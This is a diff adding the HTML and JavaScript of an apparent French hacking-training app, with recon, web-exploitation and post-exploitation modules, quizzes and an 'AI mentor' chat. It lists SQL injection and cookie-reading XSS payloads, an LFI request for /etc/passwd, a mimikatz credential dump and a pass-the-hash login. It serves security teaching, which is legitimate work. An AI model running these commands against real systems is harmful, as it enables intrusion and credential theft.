@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>GHOST//ACADEMY — Plateforme</title>
+<link rel="stylesheet" href="css/ghost.css">
+<style>
+:root { --nav-h:80px; --safe-bot:env(safe-area-inset-bottom,34px); --safe-top:env(safe-area-inset-top,44px); }
+html,body { height:100%; overflow:hidden; }
+.app { position:fixed; inset:0; display:flex; flex-direction:column; }
+/* TOP */
+.topbar {
+  padding-top:var(--safe-top);
+  background:rgba(7,13,20,0.96); border-bottom:1px solid var(--border);
+  backdrop-filter:blur(20px); flex-shrink:0; z-index:100;
+}
+.topbar-inner {
+  display:flex; align-items:center; justify-content:space-between;
+  padding:10px 16px 12px; gap:12px;
+}
+.top-logo { font-family:'Orbitron',monospace; font-weight:900; font-size:15px; letter-spacing:3px; color:var(--cyan); text-shadow:0 0 20px var(--cyan-glow); flex-shrink:0; }
+.top-logo span { color:var(--red); }
+.xp-block { text-align:right; flex-shrink:0; }
+.rank-lbl { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--cyan); letter-spacing:1px; }
+.xp-row { display:flex; align-items:center; gap:6px; margin-top:3px; }
+.xp-bar { width:70px; height:3px; background:var(--border); border-radius:2px; overflow:hidden; }
+.xp-fill { height:100%; background:linear-gradient(90deg,var(--cyan),var(--purple)); border-radius:2px; transition:width .4s ease; box-shadow:0 0 6px var(--cyan-glow); }
+.xp-num { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--text-dim); }
+/* SCROLL */
+.scroll-area { flex:1; overflow-y:auto; overflow-x:hidden; -webkit-overflow-scrolling:touch; padding-bottom:calc(var(--nav-h) + var(--safe-bot) + 16px); }
+/* BOTTOM NAV */
+.bottom-nav {
+  position:fixed; bottom:0; left:0; right:0;
+  padding-bottom:var(--safe-bot);
+  background:rgba(7,13,20,0.97); border-top:1px solid var(--border);
+  backdrop-filter:blur(20px); z-index:100;
+  display:flex; align-items:flex-start; overflow-x:auto;
+  -webkit-overflow-scrolling:touch; scrollbar-width:none;
+  padding-top:8px;
+}
+.bottom-nav::-webkit-scrollbar { display:none; }
+.nav-btn { flex-shrink:0; display:flex; flex-direction:column; align-items:center; gap:3px; padding:6px 14px 4px; background:none; border:none; cursor:pointer; min-width:64px; transition:all .2s; }
+.nav-btn .n-icon { font-size:20px; transition:transform .2s; }
+.nav-btn .n-label { font-family:'Share Tech Mono',monospace; font-size:8px; letter-spacing:.5px; color:var(--text-dim); white-space:nowrap; }
+.nav-btn.active .n-label { color:var(--cyan); }
+.nav-btn.active .n-icon { transform:scale(1.15); filter:drop-shadow(0 0 6px var(--cyan)); }
+.nav-btn.ai-nav.active .n-label { color:var(--purple); }
+.nav-btn.ai-nav.active .n-icon { filter:drop-shadow(0 0 6px var(--purple)); }
+/* PAGES */
+.page { display:none; }
+.page.active { display:block; }
+/* MODULE HEADER */
+.mod-hdr { padding:16px; background:linear-gradient(180deg,rgba(0,229,255,.04) 0%,transparent 100%); border-bottom:1px solid var(--border); }
+.mod-tag { font-family:'Share Tech Mono',monospace; font-size:9px; letter-spacing:2px; color:var(--cyan); margin-bottom:4px; }
+.mod-title { font-family:'Orbitron',monospace; font-weight:700; font-size:17px; color:var(--text-bright); text-shadow:0 0 20px rgba(0,229,255,.2); margin-bottom:4px; }
+.mod-desc { font-size:12px; color:var(--text-dim); line-height:1.5; }
+.pills { display:flex; flex-wrap:wrap; gap:6px; margin-top:10px; }
+/* SEGMENT TABS */
+.seg-tabs { display:flex; margin:12px 16px; background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:3px; gap:2px; }
+.seg-tab { flex:1; padding:8px 4px; background:none; border:none; border-radius:6px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:.5px; color:var(--text-dim); cursor:pointer; transition:all .2s; text-align:center; }
+.seg-tab.active { background:rgba(0,229,255,.12); color:var(--cyan); box-shadow:0 0 12px rgba(0,229,255,.15); }
+/* CARDS */
+.card { margin:0 16px 12px; background:var(--panel); border:1px solid var(--border); border-radius:10px; overflow:hidden; }
+.card-head { padding:11px 14px; border-bottom:1px solid var(--border); font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--cyan); background:rgba(0,229,255,.04); }
+.card-body { padding:14px; font-size:13px; line-height:1.7; color:var(--text); }
+.card-body p { margin-bottom:8px; }
+.card-body p:last-child { margin-bottom:0; }
+.card-body code { font-family:'Share Tech Mono',monospace; background:rgba(0,229,255,.08); border:1px solid rgba(0,229,255,.2); padding:1px 5px; border-radius:3px; color:var(--cyan); font-size:11px; }
+.cmd-block { background:#000; border:1px solid var(--border); border-left:3px solid var(--cyan); border-radius:0 6px 6px 0; padding:11px 14px; margin:10px 0; font-family:'Share Tech Mono',monospace; font-size:11.5px; color:var(--green); cursor:pointer; display:flex; align-items:center; gap:8px; -webkit-user-select:none; user-select:none; transition:background .15s; }
+.cmd-block:active { background:rgba(0,229,255,.06); }
+.cmd-block::before { content:'$ '; color:var(--cyan); flex-shrink:0; }
+.cmd-block .run-lbl { margin-left:auto; flex-shrink:0; font-size:9px; color:var(--cyan); border:1px solid var(--cyan); border-radius:4px; padding:2px 7px; background:var(--cyan-dim); white-space:nowrap; }
+.note-box { background:rgba(255,159,10,.08); border:1px solid rgba(255,159,10,.25); border-radius:6px; padding:10px 12px; font-size:12px; color:var(--orange); margin-top:10px; line-height:1.5; }
+/* VIDEO */
+.video-wrap { margin:0 16px 12px; border-radius:10px; overflow:hidden; background:#000; position:relative; padding-bottom:56.25%; }
+.video-wrap iframe { position:absolute; inset:0; width:100%; height:100%; border:none; }
+.video-placeholder { position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px; background:var(--panel); border:1px solid var(--border); border-radius:10px; }
+.video-placeholder-icon { font-size:36px; opacity:.4; }
+.video-placeholder-text { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-dim); letter-spacing:1px; }
+/* QUIZ */
+.quiz-card { margin:0 16px 14px; background:var(--panel); border:1px solid var(--border); border-top:2px solid var(--purple); border-radius:10px; overflow:hidden; }
+.quiz-head { padding:10px 14px; border-bottom:1px solid var(--border); font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--purple); }
+.quiz-body { padding:14px; }
+.quiz-q { font-size:13.5px; color:var(--text-bright); line-height:1.5; margin-bottom:14px; font-weight:500; }
+.quiz-opts { display:flex; flex-direction:column; gap:8px; }
+.quiz-opt { background:rgba(255,255,255,.02); border:1px solid var(--border); border-radius:8px; padding:12px 14px; font-size:13px; font-family:'Inter',sans-serif; color:var(--text); cursor:pointer; display:flex; align-items:flex-start; gap:10px; text-align:left; width:100%; transition:all .15s; line-height:1.4; min-height:48px; }
+.quiz-opt:active { background:rgba(191,90,242,.1); }
+.quiz-opt.correct { border-color:var(--green); background:var(--green-dim); color:var(--green); }
+.quiz-opt.wrong { border-color:var(--red); background:var(--red-dim); color:var(--red); }
+.quiz-opt.disabled { cursor:default; pointer-events:none; }
+.opt-ltr { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-dim); flex-shrink:0; margin-top:1px; }
+.quiz-fb { margin-top:12px; padding:11px 13px; border-radius:8px; font-size:12.5px; line-height:1.5; display:none; }
+.quiz-fb.show { display:block; }
+.quiz-fb.good { background:var(--green-dim); border:1px solid rgba(0,255,136,.25); color:var(--green); }
+.quiz-fb.bad { background:var(--red-dim); border:1px solid rgba(255,45,85,.25); color:#ff7090; }
+/* TERMINAL */
+.term-wrap { margin:0 16px 12px; background:#000; border:1px solid var(--border); border-radius:10px; overflow:hidden; }
+.term-bar { padding:9px 12px; background:var(--panel); border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+.term-dots { display:flex; gap:5px; }
+.tdot { width:9px; height:9px; border-radius:50%; }
+.tdot.r{background:#ff5f57;} .tdot.y{background:#ffbd2e;} .tdot.g{background:#28c840;}
+.term-ttl { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text-dim); flex:1; text-align:center; }
+.term-st { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--green); }
+.term-out { padding:12px; font-family:'Share Tech Mono',monospace; font-size:11.5px; line-height:1.6; min-height:120px; max-height:200px; overflow-y:auto; -webkit-overflow-scrolling:touch; }
+.t { color:#8bafc8; } .t.cmd { color:var(--green); } .t.cmd::before { content:'$ '; color:var(--cyan); }
+.t.ok{color:var(--green);} .t.err{color:var(--red);} .t.info{color:var(--cyan);} .t.warn{color:var(--orange);} .t.dim{color:var(--text-dim);}
+.term-in-row { display:flex; align-items:center; padding:10px 12px; border-top:1px solid rgba(255,255,255,.05); gap:8px; }
+.term-pmt { font-family:'Share Tech Mono',monospace; font-size:11.5px; color:var(--cyan); flex-shrink:0; }
+.term-inp { flex:1; background:none; border:none; outline:none; font-family:'Share Tech Mono',monospace; font-size:11.5px; color:var(--green); caret-color:var(--cyan); min-width:0; }
+.go-btn { background:var(--cyan-dim); border:1px solid var(--cyan); border-radius:6px; padding:7px 12px; font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--cyan); cursor:pointer; flex-shrink:0; }
+/* AI */
+.ai-area { padding:12px 16px; display:flex; flex-direction:column; gap:12px; }
+.ai-msg { display:flex; gap:8px; align-items:flex-start; }
+.ai-av { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--purple),#7b2fff); display:flex; align-items:center; justify-content:center; font-size:14px; flex-shrink:0; box-shadow:0 0 10px rgba(191,90,242,.3); }
+.ai-bbl { background:var(--panel); border:1px solid var(--border); border-radius:4px 10px 10px 10px; padding:10px 13px; font-size:13px; line-height:1.6; color:var(--text); max-width:85%; }
+.ai-bbl code { font-family:'Share Tech Mono',monospace; background:rgba(0,229,255,.08); border:1px solid rgba(0,229,255,.2); padding:1px 5px; border-radius:3px; color:var(--cyan); font-size:11px; }
+.user-msg { flex-direction:row-reverse; }
+.user-bbl { background:rgba(0,229,255,.07); border:1px solid rgba(0,229,255,.18); border-radius:10px 4px 10px 10px; padding:10px 13px; font-size:13px; color:var(--text); max-width:85%; line-height:1.5; }
+.ai-sticky { position:fixed; bottom:calc(var(--nav-h) + var(--safe-bot)); left:0; right:0; padding:10px 16px; background:rgba(7,13,20,.97); border-top:1px solid var(--border); backdrop-filter:blur(20px); display:flex; gap:8px; z-index:50; }
+.ai-inp { flex:1; background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:11px 14px; font-family:'Inter',sans-serif; font-size:14px; color:var(--text); outline:none; transition:border-color .2s; -webkit-appearance:none; }
+.ai-inp:focus { border-color:var(--purple); }
+.ai-snd { background:linear-gradient(135deg,var(--purple),#6a1fff); border:none; border-radius:10px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; font-size:18px; cursor:pointer; flex-shrink:0; }
+.ai-snd:disabled { opacity:.3; }
+/* SKILLS */
+.skill-grid { padding:12px 16px; display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+.sk-node { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:14px; }
+.sk-icon { font-size:22px; margin-bottom:6px; }
+.sk-name { font-size:12px; color:var(--text-bright); font-weight:600; margin-bottom:2px; }
+.sk-lvl { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--text-dim); margin-bottom:8px; }
+.sk-bar { height:3px; background:var(--border); border-radius:2px; overflow:hidden; }
+.sk-fill { height:100%; border-radius:2px; }
+/* HOME (module list) */
+.home-mod-card { margin:0 16px 10px; background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:14px; display:flex; align-items:center; gap:12px; cursor:pointer; transition:border-color .2s; }
+.home-mod-card:active { border-color:var(--cyan); }
+.home-mod-icon { font-size:24px; flex-shrink:0; }
+.home-mod-info { flex:1; min-width:0; }
+.home-mod-tag { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--text-dim); letter-spacing:1px; }
+.home-mod-title { font-family:'Orbitron',monospace; font-size:13px; color:var(--text-bright); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; margin-bottom:4px; }
+.home-mod-meta { font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--text-dim); }
+.home-mod-arrow { color:var(--text-dim); flex-shrink:0; font-size:14px; }
+.prog-wrap { margin:0 16px 20px; }
+.prog-label { font-family:'Share Tech Mono',monospace; font-size:9px; letter-spacing:1px; color:var(--text-dim); margin-bottom:6px; display:flex; justify-content:space-between; }
+/* STATS */
+.stats-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; padding:12px 16px; }
+.stat-box { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:12px; text-align:center; }
+.stat-n { font-family:'Orbitron',monospace; font-size:20px; font-weight:700; margin-bottom:3px; }
+.stat-l { font-family:'Share Tech Mono',monospace; font-size:8px; color:var(--text-dim); letter-spacing:1px; }
+/* typing */
+.typing span { animation:blink 1.2s infinite; color:var(--text-dim); }
+.typing span:nth-child(2){animation-delay:.2s;} .typing span:nth-child(3){animation-delay:.4s;}
+@keyframes blink{0%,80%,100%{opacity:0}40%{opacity:1}}
+</style>
+</head>
+<body>
+<div class="app">
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div class="topbar-inner">
+      <div class="top-logo">GHOST<span>//</span>ACADEMY</div>
+      <div class="xp-block">
+        <div class="rank-lbl" id="rankLbl">GHOST_INIT</div>
+        <div class="xp-row">
+          <div class="xp-bar"><div class="xp-fill" id="xpFill" style="width:0%"></div></div>
+          <div class="xp-num" id="xpNum">0 XP</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SCROLL AREA -->
+  <div class="scroll-area" id="scrollArea">
+
+    <!-- HOME PAGE -->
+    <div class="page active" id="page-home">
+      <div class="mod-hdr" style="background:linear-gradient(180deg,rgba(0,229,255,.05) 0%,transparent 100%);">
+        <div class="mod-tag">// TABLEAU DE BORD</div>
+        <div class="mod-title">BIENVENUE, GHOST</div>
+        <div class="mod-desc">Choisis ton module et continue ta progression.</div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-box"><div class="stat-n" id="sh-xp" style="color:var(--cyan)">0</div><div class="stat-l">XP TOTAL</div></div>
+        <div class="stat-box"><div class="stat-n" id="sh-q" style="color:var(--green)">0</div><div class="stat-l">QUIZ OK</div></div>
+        <div class="stat-box"><div class="stat-n" id="sh-cmd" style="color:var(--orange)">0</div><div class="stat-l">COMMANDES</div></div>
+      </div>
+      <div id="homeModList"></div>
+    </div>
+
+    <!-- RECON PAGE -->
+    <div class="page" id="page-recon">
+      <div class="mod-hdr">
+        <div class="mod-tag">// MODULE 01</div>
+        <div class="mod-title">RECONNAISSANCE</div>
+        <div class="mod-desc">Nmap, OSINT, DNS enum, Shodan. La phase la plus critique.</div>
+        <div class="pills">
+          <span class="pill pill-cyan">OSINT</span>
+          <span class="pill pill-cyan">NMAP</span>
+          <span class="pill pill-red">CTF READY</span>
+        </div>
+      </div>
+      <div class="seg-tabs">
+        <button class="seg-tab active" onclick="segTab(this,'recon','theory')">⚡ THÉORIE</button>
+        <button class="seg-tab" onclick="segTab(this,'recon','quiz')">🎯 QUIZ</button>
+        <button class="seg-tab" onclick="segTab(this,'recon','lab')">💻 LAB</button>
+      </div>
+      <div id="recon-theory">
+        <div class="card"><div class="card-head">📡 OSINT PASSIF</div><div class="card-body">
+          <p>Aucun trafic vers la cible. Sources 100% publiques.</p>
+          <div class="cmd-block" onclick="runCmd('theHarvester -d target.com -l 500 -b all','recon')">theHarvester -d target.com -l 500 -b all<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('whois target.com','recon')">whois target.com<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('subfinder -d target.com -silent','recon')">subfinder -d target.com -silent<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+        <div class="card"><div class="card-head">🔭 NMAP</div><div class="card-body">
+          <div class="cmd-block" onclick="runCmd('nmap -sV -sC -O -T4 192.168.1.1','recon')">nmap -sV -sC -O -T4 192.168.1.1<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('nmap -p- --min-rate=5000 -sV 10.10.10.1','recon')">nmap -p- --min-rate=5000 -sV 10.10.10.1<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('dig mx target.com +short','recon')">dig mx target.com +short<span class="run-lbl">▶ RUN</span></div>
+          <div class="note-box">⚡ Combine amass + subfinder + assetfinder pour une couverture maximale.</div>
+        </div></div>
+      </div>
+      <div id="recon-quiz" class="hidden"><div id="recon-qcards"></div></div>
+      <div id="recon-lab" class="hidden">
+        <div class="card"><div class="card-head">🎯 DÉFIS RECON</div><div class="card-body">
+          <p style="color:var(--cyan);margin-bottom:10px;">DÉFI 1 — Scan de version</p>
+          <div class="cmd-block" onclick="runCmd('nmap -sV 10.0.0.1','recon')">nmap -sV 10.0.0.1<span class="run-lbl">▶ RUN</span></div>
+          <p style="color:var(--cyan);margin-bottom:10px;">DÉFI 2 — Sous-domaines</p>
+          <div class="cmd-block" onclick="runCmd('subfinder -d hackthebox.com','recon')">subfinder -d hackthebox.com<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+      </div>
+      <div class="term-wrap">
+        <div class="term-bar"><div class="term-dots"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div></div><div class="term-ttl">ghost@academy:~</div><div class="term-st pulse">● LIVE</div></div>
+        <div class="term-out" id="term-recon"><div class="t info">// MODULE RECONNAISSANCE</div><div class="t dim">Clique ▶ RUN ou tape une commande</div><div class="t"> </div></div>
+        <div class="term-in-row"><div class="term-pmt">$</div><input class="term-inp" id="tinput-recon" placeholder="commande..." onkeydown="if(event.key==='Enter'){runCmd(this.value,'recon');this.value='';}"><button class="go-btn" onclick="var i=document.getElementById('tinput-recon');runCmd(i.value,'recon');i.value='';">GO</button></div>
+      </div>
+    </div>
+
+    <!-- WEB PAGE -->
+    <div class="page" id="page-web">
+      <div class="mod-hdr">
+        <div class="mod-tag">// MODULE 03</div>
+        <div class="mod-title">WEB EXPLOITATION</div>
+        <div class="mod-desc">SQLi, XSS, LFI, SSRF. OWASP Top 10 complet.</div>
+        <div class="pills"><span class="pill pill-red">SQL INJECTION</span><span class="pill pill-red">XSS</span><span class="pill pill-cyan">BURP SUITE</span></div>
+      </div>
+      <div class="seg-tabs">
+        <button class="seg-tab active" onclick="segTab(this,'web','theory')">⚡ THÉORIE</button>
+        <button class="seg-tab" onclick="segTab(this,'web','quiz')">🎯 QUIZ</button>
+        <button class="seg-tab" onclick="segTab(this,'web','lab')">💻 LAB</button>
+      </div>
+      <div id="web-theory">
+        <div class="card"><div class="card-head">💉 SQL INJECTION</div><div class="card-body">
+          <p>Test manuel : <code>' OR 1=1-- -</code> · <code>' UNION SELECT null,null-- -</code></p>
+          <div class="cmd-block" onclick="runCmd('sqlmap -u http://target.com/?id=1 --dbs --batch','web')">sqlmap -u target/?id=1 --dbs --batch<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+        <div class="card"><div class="card-head">🎯 XSS</div><div class="card-body">
+          <p>Basique : <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+          <p>Bypass : <code>&lt;img src=x onerror=alert(1)&gt;</code></p>
+          <div class="cmd-block" onclick="runCmd('dalfox url http://target.com/search?q=test','web')">dalfox url http://target.com/search?q=test<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+        <div class="card"><div class="card-head">🔁 FUZZING & LFI</div><div class="card-body">
+          <div class="cmd-block" onclick="runCmd('ffuf -u http://target.com/FUZZ -w big.txt -mc 200,301','web')">ffuf -u http://target.com/FUZZ -w big.txt<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('curl http://target.com/page.php?file=../../etc/passwd','web')">curl LFI /etc/passwd<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+      </div>
+      <div id="web-quiz" class="hidden"><div id="web-qcards"></div></div>
+      <div id="web-lab" class="hidden">
+        <div class="card"><div class="card-head">🎯 DÉFIS WEB</div><div class="card-body">
+          <div class="cmd-block" onclick="runCmd('sqlmap -u http://target.com/?id=1 --dbs','web')">sqlmap detection<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('ffuf -u http://target.com/FUZZ -w common.txt','web')">ffuf fuzzing<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+      </div>
+      <div class="term-wrap">
+        <div class="term-bar"><div class="term-dots"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div></div><div class="term-ttl">ghost@academy:~</div><div class="term-st pulse">● LIVE</div></div>
+        <div class="term-out" id="term-web"><div class="t info">// WEB EXPLOITATION</div><div class="t dim">Prêt</div><div class="t"> </div></div>
+        <div class="term-in-row"><div class="term-pmt">$</div><input class="term-inp" id="tinput-web" placeholder="commande..." onkeydown="if(event.key==='Enter'){runCmd(this.value,'web');this.value='';}"><button class="go-btn" onclick="var i=document.getElementById('tinput-web');runCmd(i.value,'web');i.value='';">GO</button></div>
+      </div>
+    </div>
+
+    <!-- POST PAGE -->
+    <div class="page" id="page-post">
+      <div class="mod-hdr">
+        <div class="mod-tag">// MODULE 04</div>
+        <div class="mod-title">POST-EXPLOITATION</div>
+        <div class="mod-desc">Privesc, pivoting, credentials dump. Escalade depuis ton foothold.</div>
+        <div class="pills"><span class="pill pill-red">PRIVESC</span><span class="pill pill-red">MIMIKATZ</span><span class="pill pill-cyan">PIVOTING</span></div>
+      </div>
+      <div class="seg-tabs">
+        <button class="seg-tab active" onclick="segTab(this,'post','theory')">⚡ THÉORIE</button>
+        <button class="seg-tab" onclick="segTab(this,'post','quiz')">🎯 QUIZ</button>
+        <button class="seg-tab" onclick="segTab(this,'post','lab')">💻 LAB</button>
+      </div>
+      <div id="post-theory">
+        <div class="card"><div class="card-head">⬆️ LINUX PRIVESC</div><div class="card-body">
+          <div class="cmd-block" onclick="runCmd('sudo -l','post')">sudo -l<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('find / -perm -4000 -type f 2>/dev/null','post')">find SUID binaries<span class="run-lbl">▶ RUN</span></div>
+          <div class="note-box">⚡ GTFOBins.github.io — exploite n'importe quel binaire SUID/sudo.</div>
+        </div></div>
+        <div class="card"><div class="card-head">🪟 WINDOWS</div><div class="card-body">
+          <div class="cmd-block" onclick="runCmd('mimikatz # sekurlsa::logonpasswords','post')">mimikatz dump<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('evil-winrm -i 10.10.10.1 -u Admin -H HASH','post')">evil-winrm pass-the-hash<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+      </div>
+      <div id="post-quiz" class="hidden"><div id="post-qcards"></div></div>
+      <div id="post-lab" class="hidden">
+        <div class="card"><div class="card-head">🎯 DÉFIS POST-EXPLOIT</div><div class="card-body">
+          <div class="cmd-block" onclick="runCmd('find / -perm -4000 2>/dev/null','post')">find SUID<span class="run-lbl">▶ RUN</span></div>
+          <div class="cmd-block" onclick="runCmd('sudo -l','post')">sudo -l<span class="run-lbl">▶ RUN</span></div>
+        </div></div>
+      </div>
+      <div class="term-wrap">
+        <div class="term-bar"><div class="term-dots"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div></div><div class="term-ttl">ghost@academy:~</div><div class="term-st pulse">● LIVE</div></div>
+        <div class="term-out" id="term-post"><div class="t info">// POST-EXPLOITATION</div><div class="t dim">Prêt</div><div class="t"> </div></div>
+        <div class="term-in-row"><div class="term-pmt">$</div><input class="term-inp" id="tinput-post" placeholder="commande..." onkeydown="if(event.key==='Enter'){runCmd(this.value,'post');this.value='';}"><button class="go-btn" onclick="var i=document.getElementById('tinput-post');runCmd(i.value,'post');i.value='';">GO</button></div>
+      </div>
+    </div>
+
+    <!-- AI PAGE -->
+    <div class="page" id="page-ai">
+      <div class="mod-hdr" style="background:linear-gradient(180deg,rgba(191,90,242,.06) 0%,transparent 100%);border-bottom:1px solid rgba(191,90,242,.2);">
+        <div class="mod-tag" style="color:var(--purple)">// GHOST AI</div>
+        <div class="mod-title">AI MENTOR</div>
+        <div class="mod-desc">Ton mentor cybersécurité disponible 24/7. Pose n'importe quelle question technique.</div>
+        <div class="pills"><span class="pill pill-purple">HACKING</span><span class="pill pill-purple">CTF</span><span class="pill pill-purple">TOOLS</span></div>
+      </div>
+      <div class="card" style="margin-top:12px;"><div class="card-head" style="color:var(--purple)">🤖 IA EN LOCAL — OLLAMA</div><div class="card-body">
+        <div class="cmd-block" onclick="runCmd('ollama run llama3','recon')">ollama run llama3<span class="run-lbl">▶ RUN</span></div>
+        <div class="cmd-block" onclick="runCmd('ollama run codellama:7b','recon')">ollama run codellama:7b<span class="run-lbl">▶ RUN</span></div>
+      </div></div>
+      <div class="ai-area" id="aiMessages">
+        <div class="ai-msg"><div class="ai-av">👾</div><div class="ai-bbl">Ghost AI en ligne. Pose ta question — hacking, CTF, outils, exploitation. Je suis ton mentor.</div></div>
+      </div>
+      <div style="height:70px;"></div>
+    </div>
+
+    <!-- SKILLS PAGE -->
+    <div class="page" id="page-skills">
+      <div class="mod-hdr"><div class="mod-tag">// PROGRESSION</div><div class="mod-title">COMPÉTENCES</div><div class="mod-desc">Ta maîtrise en temps réel.</div></div>
+      <div class="stats-row">
+        <div class="stat-box"><div class="stat-n" id="sk-xp" style="color:var(--cyan)">0</div><div class="stat-l">XP</div></div>
+        <div class="stat-box"><div class="stat-n" id="sk-c" style="color:var(--green)">0</div><div class="stat-l">CORRECTS</div></div>
+        <div class="stat-box"><div class="stat-n" id="sk-s" style="color:var(--orange)">0%</div><div class="stat-l">SCORE</div></div>
+      </div>
+      <div class="skill-grid" id="skillGrid"></div>
+    </div>
+
+  </div><!-- end scroll-area -->
+
+  <!-- BOTTOM NAV -->
+  <div class="bottom-nav">
+    <button class="nav-btn active" onclick="goPage('home',this)"><span class="n-icon">🏠</span><span class="n-label">HOME</span></button>
+    <button class="nav-btn" onclick="goPage('recon',this)"><span class="n-icon">🔍</span><span class="n-label">RECON</span></button>
+    <button class="nav-btn" onclick="goPage('web',this)"><span class="n-icon">💉</span><span class="n-label">WEB</span></button>
+    <button class="nav-btn" onclick="goPage('post',this)"><span class="n-icon">🔓</span><span class="n-label">POST</span></button>
+    <button class="nav-btn ai-nav" onclick="goPage('ai',this)"><span class="n-icon">🤖</span><span class="n-label">GHOST AI</span></button>
+    <button class="nav-btn" onclick="goPage('skills',this)"><span class="n-icon">🌳</span><span class="n-label">SKILLS</span></button>
+  </div>
+
+  <!-- AI STICKY INPUT -->
+  <div class="ai-sticky hidden" id="aiBar">
+    <input type="text" class="ai-inp" id="aiInput" placeholder="Pose ta question hacking…" onkeydown="if(event.key==='Enter')sendAI()">
+    <button class="ai-snd" id="aiSnd" onclick="sendAI()">➤</button>
+  </div>
+</div>
+
+<script src="js/config.js"></script>
+<script>
+// ── STATE ──
+let xp=0,totalQ=0,totalC=0,cmdCount=0;
+const skills=[
+  {n:'Reconnaissance',i:'🔍',c:'#00e5ff',v:0},
+  {n:'Web Exploit',i:'💉',c:'#ff2d55',v:0},
+  {n:'Post-Exploit',i:'🔓',c:'#ff9f0a',v:0},
+  {n:'Ghost AI',i:'🤖',c:'#bf5af2',v:0},
+];
+const ranks=[[0,'GHOST_INIT'],[200,'SCRIPT_KID'],[500,'GREY_HAT'],[1000,'BLACK_HAT'],[2000,'ELITE_HACKER'],[5000,'PHANTOM_0DAY']];
+const skillMod={recon:0,web:1,post:2,ai:3};
+
+// ── QUIZ DATA ──
+const QD={
+  recon:[
+    {q:"Quel flag Nmap détecte les versions des services ?",o:["A. -sS","B. -sV","C. -O","D. -p-"],c:1,e:"`-sV` interroge les services pour identifier leur version exacte. Essentiel pour trouver des CVE exploitables."},
+    {q:"Shodan permet de trouver :",o:["A. Des sous-domaines","B. Des appareils connectés exposés sur internet","C. Des mots de passe","D. Du code source"],c:1,e:"Shodan indexe les bannières de services internet. Parfait pour trouver des IoT/serveurs mal configurés sans toucher la cible."},
+    {q:"La commande `dig axfr @ns1.target.com target.com` sert à :",o:["A. Scanner les ports","B. Tenter un transfert de zone DNS","C. Bruteforcer un login","D. Capturer du trafic"],c:1,e:"AXFR (Zone Transfer) récupère toutes les entrées DNS. Mal configuré, il révèle toute l'infrastructure en une commande."},
+  ],
+  web:[
+    {q:"Le payload `' OR 1=1-- -` teste :",o:["A. Une injection XSS","B. Un bypass d'authentification SQL","C. Un scan de ports","D. Une capture de cookies"],c:1,e:"Ce payload ferme la chaîne SQL et ajoute une condition toujours vraie. Si la page change → injection SQL confirmée."},
+    {q:"La différence XSS Stored vs Reflected ?",o:["A. Aucune","B. Stored est en BDD, Reflected dans l'URL","C. Reflected est plus dangereux","D. Stored ne vole pas les cookies"],c:1,e:"XSS Stored est sauvegardé et s'exécute pour chaque visiteur — bien plus dangereux que Reflected qui nécessite un lien cliqué."},
+    {q:"ffuf est utilisé pour :",o:["A. Craquer des hash","B. Fuzzer des endpoints web","C. Sniffer le trafic","D. Élever les privilèges"],c:1,e:"ffuf (Fuzz Faster U Fool) est l'outil de référence pour découvrir des répertoires, paramètres et vhosts cachés."},
+  ],
+  post:[
+    {q:"`sudo -l` affiche :",o:["A. Les processus actifs","B. Les commandes exécutables en root sans password","C. Les connexions réseau","D. Les fichiers modifiés"],c:1,e:"PREMIÈRE commande en privesc Linux. Liste ce que tu peux exécuter sans password. Consulte GTFOBins ensuite."},
